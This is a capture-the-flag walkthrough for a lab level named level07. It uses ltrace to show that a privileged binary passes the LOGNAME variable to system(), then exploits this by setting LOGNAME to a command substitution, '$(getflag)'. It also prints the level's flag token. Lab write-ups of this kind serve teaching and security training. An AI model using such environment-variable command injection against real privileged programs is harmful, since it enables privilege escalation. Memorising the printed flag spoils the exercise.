
# Resources for level07

## Walkthrough to capture the flag:

### Step 1: Inspect the binary behavior with `ltrace`
```bash
ltrace ./level07
```

> Output (simplified):
```
getegid()                 = 2007
geteuid()                 = 2007
setresgid(2007, 2007, 2007) = 0
setresuid(2007, 2007, 2007) = 0
getenv("LOGNAME")         = "level07"
asprintf(...)             = ...
system("/bin/echo level07") = ...
```

> The binary fetches the environment variable `LOGNAME` and then executes it via `/bin/echo`. This allows for **command injection** by manipulating `LOGNAME`.

---

### Step 2: Inject a command via the `LOGNAME` environment variable

```bash
export LOGNAME='$(getflag)'
```

> This sets `LOGNAME` to a shell substitution. When `system("/bin/echo $LOGNAME")` is executed, it becomes:

```bash
/bin/echo $(getflag)
```

> Which runs `getflag` and prints the result.

---

### Step 3: Execute the vulnerable binary

```bash
./level07
```

> Output:

```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

---

## ✅ Final Flag

```
fiumuikeil55xe9cu4dood66h
```

---

## ✅ Summary

- **Vulnerability**: Unsanitized use of environment variable in `system()`
- **Exploit**: `export LOGNAME='$(getflag)'`
- **Flag**: `fiumuikeil55xe9cu4dood66h`
